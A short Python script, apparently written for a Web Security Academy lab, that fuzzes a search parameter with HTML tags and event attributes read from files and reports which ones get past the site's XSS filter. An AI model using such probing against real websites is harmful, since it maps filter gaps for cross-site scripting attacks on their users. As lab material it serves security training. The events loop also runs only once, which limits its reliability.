import requests

url = "https://id.web-security-academy.net:443/?search="
cookies = {"session": "your-session"}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0ad3003c04e5c31d828be8400077003e.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
requests.get(url, headers=headers, cookies=cookies)


tags = open('tags.txt', 'r')
events = open('events.txt', 'r')
for tag in tags:
    request = f"https://id.web-security-academy.net:443/?search=<{tag}>"
    response = requests.get(request, headers=headers, cookies=cookies).text

    if "Tag is not allowed" not in response:
        for event in events:
            request = f"https://id.web-security-academy.net:443/?search=<{tag}+{event}>"
            response = requests.get(request, headers=headers, cookies=cookies).text

            if "Attribute is not allowed" not in response:
                print(f"<{tag.strip('\n')} {event.strip('\n')}> is allowed")


tags.close()
events.close()
